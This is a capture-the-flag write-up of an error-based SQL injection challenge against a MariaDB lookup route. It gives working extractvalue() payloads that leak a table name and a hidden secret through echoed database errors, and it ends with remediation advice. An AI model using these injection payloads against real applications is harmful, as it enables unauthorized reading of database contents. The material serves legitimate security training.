# Netero's Recipe Vault, Debrief

**Node:** `p1_2` &middot; **Flag:** `SEIYAKU{100_type_error_leak}` &middot; **Route:** `GET /p1/recipe` &middot; **Sink:** `challenges/phase1.py`, `mariadb` (`vault` table)

## Root cause

The lookup route builds its query the same way the Gate of Trust did,
raw f-string concatenation, no escaping:

```python
# challenges/phase1.py
q = f"SELECT name FROM vault WHERE id='{recipe_id}'"  # VULN: string concat
cur.execute(q)
row = cur.fetchone()
```

But this floor's real bug sits one line down, in the `except` block:

```python
except Exception as exc:
    error = str(exc)   # VULN: raw DBMS error text echoed back to the client
```

Normal SQLi extraction (like p1_1's `UNION`-free auth bypass) works by
getting the *result set* to contain what you want. Error-based extraction
is different: it never needs a working query at all. It only needs the
database to fail in a way whose error *message* contains the data. Since
this route prints `str(exc)` straight into the page, any function that
raises an exception carrying attacker-chosen text becomes an exfiltration
channel, no `UNION`, no matching column count, no working `SELECT`
required.

## The technique: `extractvalue()`

MariaDB (and MySQL) ship `extractvalue(xml_frag, xpath_expr)`, a function
meant to run an XPath query against a fragment of XML and return the
matched node. `xpath_expr` is expected to be a *valid XPath expression
string*. Handing it something that **isn't** valid XPath, like a plain
colon-prefixed string, makes `extractvalue()` throw before it ever
touches real XML, and MariaDB's error handler for that failure embeds the
first ~32 characters of the offending `xpath_expr` string directly in the
exception text: `XPATH syntax error: '<up to 32 chars here>'`.

That's the whole trick: `xpath_expr` doesn't have to be a literal, it can
be the *result of a subquery*, computed at query time. Feed it your own
`SELECT` wrapped in `concat()`, and MariaDB helpfully quotes back
whatever that subquery returned, packaged inside its own error message.

## The walk

**1. Confirm the sink is reachable and errors leak verbatim.** A bare
quote in `id` is enough:

```
/p1/recipe?id=1'
```

The page's error panel echoes the raw exception, same pattern as p1_1,
but this time it's the entire exploit surface, not just a fingerprinting
tell.

**2. Prove the error message isn't just noisy, it's a read primitive.**
`extractvalue(xml_frag, xpath_expr)` rejects anything that isn't valid
XPath and quotes back (up to ~32 chars of) whatever `xpath_expr`
evaluated to. Since `xpath_expr` can be a subquery, this is a channel
that reads whatever you point it at, not just a crash:

```
id=1' AND extractvalue(1,concat(0x7e,'canary-value'))-- -
```

```
(1105, "XPATH syntax error: '~canary-value'")
```

Your own literal string came back inside the DBMS's own error. `0x7e`
is just a hex literal for `~`, a visible marker so the leaked value is
easy to spot in the text; it carries no special meaning to MariaDB.

**3. Don't assume the table name, find it.** Nothing so far has named
`vault`, and nothing so far requires reading the app's source either.
Two column names are already sitting in plain view, from things anyone
testing this black-box would already have looked at:

- A completely ordinary, non-malicious lookup, `/p1/recipe?id=1`, no
  injection involved at all, renders `name> Roasted Nen Beast Stew`.
  The app's own UI labels that field `name` for you.
- `CHALLENGER.md`'s objective line names `secret` as the field being
  chased: "Read the vault's hidden `secret` field."

That's it, that's the whole basis for the next query: not a guess, not
a peek at `challenges/phase1.py`, just two labels the app and the
briefing already handed over. MariaDB's own `information_schema` can
now answer "which table has both":

```
id=1' AND extractvalue(1,concat(0x7e,(SELECT c1.table_name
    FROM information_schema.columns c1
    WHERE c1.table_schema=database() AND c1.column_name='secret'
    AND EXISTS (SELECT 1 FROM information_schema.columns c2
                WHERE c2.table_schema=c1.table_schema
                AND c2.table_name=c1.table_name
                AND c2.column_name='name')
    LIMIT 1)))-- -
```

```
(1105, "XPATH syntax error: '~vault'")
```

Two things worth calling out about this step:

- Filtering on `column_name='secret'` alone is **not** enough. This
  MariaDB instance is one shared schema across every phase of the whole
  arc, `records`, `keeper`, `sealed_cards`, `examiner_vault`, and others
  all have their own `secret` column too. The `name`+`secret` combination
  is what actually narrows it down to this floor's table, matching the
  two labels step 3 actually observed (the rendered `name>` field and
  the briefing's `secret`), not a guess at either one.
- A cruder first instinct, dumping every table name in the schema via
  `group_concat(table_name)`, genuinely doesn't work here: the result is
  long enough (dozens of tables across 18 floors) that it blows straight
  through `extractvalue()`'s ~32-character truncation before you ever
  see something recognizable. The targeted, column-shape-aware query
  above is the one that actually fits in that window.

**4. Now extract the secret**, from the table this step actually found:

```
1' AND extractvalue(1,concat(0x7e,(SELECT secret FROM vault LIMIT 1)))-- -
```

**5. MariaDB evaluates the subquery first**, gets back the flag string,
concatenates it after `~`, hands that to `extractvalue()` as its XPath
argument, and `extractvalue()` immediately rejects it as invalid XPath.
The resulting exception, verbatim from this exact seed and route:

```
(1105, "XPATH syntax error: '~SEIYAKU{100_type_error_leak}'")
```

The flag is short enough (well under MariaDB's ~32-character truncation
window for this error) to come through whole in a single request, no
need to binary-search or `SUBSTRING()` it out character by character, the
way blind boolean/time-based techniques would require.

**6.** `challenges/phase1.py`'s `except` block catches that exception,
stores `str(exc)` in `error`, and `templates/p1_recipe.html` prints it
verbatim in the "the vault stumbled over your query" panel. The flag is
on the page.

## HxH analogy

Isaac Netero's whole reputation rests on the idea that he's too fast to
read, by the time you've registered where his fist is, it's already
somewhere else, and you're left reacting to an attack that already
landed. But "too fast to read" and "gives away nothing" aren't the same
claim. A strike that connects, even one thrown at inhuman speed, still
displaces air, still leaves an afterimage, still tells a sufficiently
attentive opponent something about the technique that threw it, not
because the technique failed, but because *any* motion that fast still
has to interact with the world it moves through.

The vault's mistake is the same shape. It isn't naive about its main
channel, a normal lookup really does only ever hand back a `name`. But
it never considered that a lookup which *misfires* is still an
interaction with the database, and that MariaDB's own diagnostics for
that misfire are willing to narrate exactly what was being computed at
the moment it broke. The vault was never touched at its front door. It
gave up the secret in the recoil.

## Remediation

- **Parameterized queries, always**, the same fix as p1_1:

  ```python
  cur.execute("SELECT name FROM vault WHERE id=%s", (recipe_id,))
  ```

  This alone closes the injection point entirely; `extractvalue()` would
  never get attacker-controlled SQL to evaluate in the first place.
- **Never return raw DBMS exception text to the client.** This is the
  bug that actually made extraction possible here, even a leftover
  injection point is far less dangerous if a failing query just returns
  a generic "recipe not found" and logs the real exception server-side
  instead of rendering `str(exc))` to the page.
- **Least privilege on the DB account.** An app account that can only
  `SELECT` the `name` column it needs (column-level grants, or a view
  that never exposes `secret`) limits what even a successful injection
  can reach.
